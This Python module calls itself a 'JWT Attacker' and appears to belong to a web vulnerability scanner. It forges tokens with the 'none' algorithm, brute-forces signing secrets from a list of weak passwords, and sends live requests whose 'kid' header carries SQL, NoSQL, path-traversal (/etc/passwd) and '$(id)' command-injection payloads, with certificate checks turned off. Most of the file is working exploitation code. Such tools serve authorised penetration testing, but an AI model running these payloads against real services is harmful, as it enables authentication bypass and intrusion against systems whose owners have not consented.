"""
JWT Attacker: Advanced JWT vulnerability detection and exploitation.

Attack Techniques:
  1. Algorithm confusion (none/HS256→RS256)
  2. Weak secret brute-force
  3. JWK/JWKS injection
  4. Key confusion (RS256→HS256)
  5. Claim manipulation (exp/nbf/iat/aud)
  6. JKU/X5U injection
  7. JWT from JWK endpoint
  8. Cross-tenant JWT manipulation
"""
import base64
import hashlib
import hmac
import json
import re
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin

from tools.http_client import HttpClient
from tools.log_utils import get_logger

logger = get_logger("jwt_attacker")

try:
    import jwt as pyjwt
    HAS_PYJWT = True
except ImportError:
    HAS_PYJWT = False

try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


WEAK_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "key", "test",
    "changeme", "admin", "supersecret", "mysecret", "12345678",
    "keyboard cat", "qwerty", "abc123", "letmein", "welcome",
    "monkey", "dragon", "master", "login", "princess",
    "football", "shadow", "sunshine", "trustno1", "iloveyou",
    "batman", "access", "hello", "charlie", "donald",
    "root", "toor", "pass", "passwd", "admin123",
    "default", "s3cr3t", "h4ck3d", "p@ssw0rd", "!@#$%^&*",
]

ALG_CONFUSION_PAYLOADS = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "none", "typ": "JWT", "kid": ""},
]

CLAIM_MANIPULATIONS = [
    {"exp": 9999999999, "iat": 0, "nbf": 0},
    {"role": "admin", "admin": True, "is_admin": True, "isAdmin": True},
    {"sub": "admin", "user": "admin", "username": "admin"},
    {"aud": "admin", "scope": "admin"},
]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def b64url_decode(s: str) -> bytes:
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def parse_jwt(token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None, None, None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        signature = parts[2]
        return header, payload, signature
    except Exception:
        return None, None, None


class JWTAttacker:
    """
    Advanced JWT vulnerability detection and exploitation.

    Usage:
        attacker = JWTAttacker(sess, timeout)
        result = attacker.check(url)
        # Or attack a specific token
        result = attacker.attack_token(token)
    """

    def __init__(self, sess: 'requests.Session' = None, timeout: float = 10.0):
        self.sess = sess or HttpClient()
        self.timeout = timeout

    def _find_token(self, url: str) -> Optional[str]:
        try:
            resp = self.sess.get(url, timeout=self.timeout, verify=False, allow_redirects=False)
            token = None

            auth_header = resp.headers.get("Authorization", "")
            if "Bearer" in auth_header:
                token = auth_header.split("Bearer")[-1].strip()

            for cookie in resp.cookies.values():
                if len(cookie) > 50 and cookie.count('.') == 2:
                    token = cookie
                    break

            body = resp.text
            token_match = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
            if token_match:
                token = token_match.group(0)

            return token
        except Exception as e:
            logger.debug("Failed to find token: %s", e)
            return None

    def _find_jwks_endpoint(self, base_url: str) -> Optional[str]:
        candidates = [
            "/.well-known/jwks.json", "/jwks.json", "/jwt/jwks",
            "/api/jwks", "/auth/jwks", "/.well-known/openid-configuration",
        ]
        for path in candidates:
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
            try:
                resp = self.sess.get(url, timeout=self.timeout, verify=False)
                if resp.status_code == 200:
                    data = resp.json()
                    if "keys" in data or "jwks_uri" in data:
                        return url
            except Exception:
                pass
        return None

    def check(self, url: str, **kwargs) -> Dict:
        findings = []
        token = kwargs.get("token") or self._find_token(url)

        if not token:
            return {
                "vulnerable": False,
                "vuln_type": "jwt",
                "confidence": 0.0,
                "findings": [],
                "message": "No JWT token found",
            }

        findings.extend(self.attack_token(token, url))

        return {
            "vulnerable": any(f.get("confirmed") for f in findings),
            "vuln_type": "jwt",
            "confidence": max([f.get("confidence", 0) for f in findings], default=0),
            "findings": findings,
            "token": token[:50] + "...",
        }

    def attack_token(self, token: str, url: str = "") -> List[Dict]:
        findings = []
        header, payload, signature = parse_jwt(token)

        if not header or not payload:
            return [{"method": "parse_error", "confidence": 0, "confirmed": False}]

        findings.extend(self._check_alg_none(token, header, payload))
        findings.extend(self._check_alg_confusion(token, header, payload))
        findings.extend(self._check_weak_secret(token, header, payload))
        findings.extend(self._check_claim_manipulation(token, header, payload))
        findings.extend(self._check_key_injection(token, header, payload, url))
        findings.extend(self._check_jku_x5u(token, header, payload, url))

        return findings

    def _check_alg_none(self, token: str, header: Dict, payload: Dict) -> List[Dict]:
        findings = []
        alg = header.get("alg", "").lower()

        if alg == "none":
            findings.append({
                "method": "alg_none",
                "confidence": 0.95,
                "confirmed": True,
                "severity": "critical",
                "description": "JWT uses 'none' algorithm - signature verification bypassed",
                "header": header,
                "payload": payload,
            })

        for alg_variant in ["none", "None", "NONE", "nOnE"]:
            try:
                parts = token.split('.')
                test_header = dict(header)
                test_header["alg"] = alg_variant
                new_token = b64url_encode(json.dumps(test_header).encode()) + '.' + parts[1] + '.'
                findings.append({
                    "method": "alg_none_variant",
                    "confidence": 0.80,
                    "confirmed": False,
                    "variant": alg_variant,
                    "token": new_token[:80] + "...",
                })
            except Exception:
                pass

        return findings

    def _check_alg_confusion(self, token: str, header: Dict, payload: Dict) -> List[Dict]:
        findings = []
        alg = header.get("alg", "")

        if alg.startswith("RS"):
            hs_alg = "HS" + alg[2:]
            findings.append({
                "method": "key_confusion_rs_to_hs",
                "confidence": 0.80,
                "confirmed": False,
                "description": "RS256→HS256 key confusion possible (use public key as HMAC secret)",
                "original_alg": alg,
                "confused_alg": hs_alg,
            })

        if alg.startswith("HS") and int(alg[2:]) >= 384:
            findings.append({
                "method": "strong_hmac",
                "confidence": 0.30,
                "confirmed": False,
                "description": "Strong HMAC algorithm in use, brute-force harder",
            })

        return findings

    def _check_weak_secret(self, token: str, header: Dict, payload: Dict) -> List[Dict]:
        findings = []
        alg = header.get("alg", "HS256")

        if not alg.startswith("HS"):
            return findings

        parts = token.split('.')
        signing_input = (parts[0] + '.' + parts[1]).encode()

        for secret in WEAK_SECRETS:
            try:
                if alg == "HS256":
                    expected = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                elif alg == "HS384":
                    expected = hmac.new(secret.encode(), signing_input, hashlib.sha384).digest()
                elif alg == "HS512":
                    expected = hmac.new(secret.encode(), signing_input, hashlib.sha512).digest()
                else:
                    continue
                expected_b64 = b64url_encode(expected)
                if expected_b64 == parts[2]:
                    findings.append({
                        "method": "weak_secret",
                        "confidence": 0.95,
                        "confirmed": True,
                        "severity": "critical",
                        "secret": secret,
                        "algorithm": alg,
                        "payload": payload,
                    })
                    break
            except Exception:
                continue

        return findings

    def _check_claim_manipulation(self, token: str, header: Dict, payload: Dict) -> List[Dict]:
        findings = []

        manipulations = []

        if "exp" in payload:
            exp = payload["exp"]
            if isinstance(exp, (int, float)):
                if exp < time.time():
                    manipulations.append("expired_token")
                elif exp > time.time() + 86400 * 365 * 10:
                    manipulations.append("far_future_exp")

        if "role" in payload:
            role = payload["role"]
            if role not in ["admin", "administrator", "superuser"]:
                manipulations.append("role_enumeration")

        admin_clines = ["admin", "is_admin", "isAdmin", "is_superuser", "role"]
        for claim in admin_clines:
            if claim in payload:
                manipulations.append("admin_claim_found")

        if payload.get("role") == "admin" or payload.get("is_admin") is True:
            findings.append({
                "method": "admin_claim",
                "confidence": 0.70,
                "confirmed": True,
                "claim": "role" if "role" in payload else "is_admin",
                "value": payload.get("role", payload.get("is_admin")),
            })

        if manipulations:
            findings.append({
                "method": "claim_manipulation",
                "confidence": 0.60,
                "confirmed": False,
                "manipulations": manipulations,
            })

        return findings

    def _check_key_injection(self, token: str, header: Dict, payload: Dict, url: str) -> List[Dict]:
        findings = []

        if not url:
            return findings

        jwks_url = self._find_jwks_endpoint(url)
        if jwks_url:
            findings.append({
                "method": "jwks_endpoint_found",
                "confidence": 0.60,
                "confirmed": False,
                "jwks_url": jwks_url,
                "description": "JWKS endpoint discovered - potential for key injection",
            })

        if "kid" in header:
            original_header = dict(header)
            findings.append({
                "method": "kid_present",
                "confidence": 0.40,
                "confirmed": False,
                "kid": header["kid"],
                "description": "JWT has 'kid' parameter - potential for path traversal / SQL injection",
            })
            kid_injections = [
                ("sql", "' UNION SELECT 'fakekey' --", "SQLi in kid"),
                ("sql_mysql", "' UNION SELECT 'fakekey'#", "MySQL SQLi in kid"),
                ("sql_mssql", "' UNION SELECT 'fakekey'--", "MSSQL SQLi in kid"),
                ("path_linux", "../../../dev/null", "Linux path traversal in kid"),
                ("path_win", "..\\..\\..\\windows\\win.ini", "Windows path traversal in kid"),
                ("path_null", "../../../dev/null%00", "Null byte injection in kid"),
                ("path_etc", "/etc/passwd", "/etc/passwd in kid"),
                ("nosqli_mongo", {"$ne": "invalid"}, "NoSQLi $ne in kid"),
                ("nosqli_gt", {"$gt": ""}, "NoSQLi $gt in kid"),
                ("cmdi", "$(id)", "Command injection in kid"),
            ]
            for inj_type, inj_value, desc in kid_injections:
                try:
                    test_header = dict(original_header)
                    test_header["kid"] = inj_value
                    test_token = self._encode_token(test_header, payload)
                    resp = self.sess.get(url, headers={"Authorization": "Bearer %s" % test_token},
                                        timeout=self.timeout, verify=False)
                    if resp.status_code not in (401, 403, 500, 502, 503):
                        findings.append({
                            "method": "kid_injection",
                            "confidence": 0.85 if resp.status_code in (200, 302) else 0.60,
                            "confirmed": resp.status_code in (200, 302),
                            "kid_injection_type": inj_type,
                            "kid_value": str(inj_value)[:30],
                            "status": resp.status_code,
                            "description": desc,
                        })
                        if resp.status_code in (200, 302):
                            break
                except Exception as e:
                    logger.debug("kid injection %s: %s", inj_type, e)

        return findings

    def _encode_token(self, header: Dict, payload: Dict) -> str:
        import hashlib
        import hmac
        hdr_b64 = self._b64(json.dumps(header, separators=(",", ":")).encode())
        pld_b64 = self._b64(json.dumps(payload, separators=(",", ":")).encode())
        sig = hmac.new(b"dummy", ("%s.%s" % (hdr_b64, pld_b64)).encode(), hashlib.sha256).hexdigest()
        return "%s.%s.%s" % (hdr_b64, pld_b64, sig)

    def _b64(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _check_jku_x5u(self, token: str, header: Dict, payload: Dict, url: str) -> List[Dict]:
        findings = []

        if "jku" in header:
            jku = header["jku"]
            findings.append({
                "method": "jku_injection",
                "confidence": 0.75,
                "confirmed": False,
                "jku": jku,
                "description": "JKU header present - potential for key URL injection",
            })

        if "x5u" in header:
            x5u = header["x5u"]
            findings.append({
                "method": "x5u_injection",
                "confidence": 0.70,
                "confirmed": False,
                "x5u": x5u,
                "description": "X5U header present - potential for certificate URL injection",
            })

        return findings


def check(url: str, param: str = None, sess=None, timeout: float = 10.0, **kwargs) -> Dict:
    attacker = JWTAttacker(sess, timeout)
    return attacker.check(url, **kwargs)
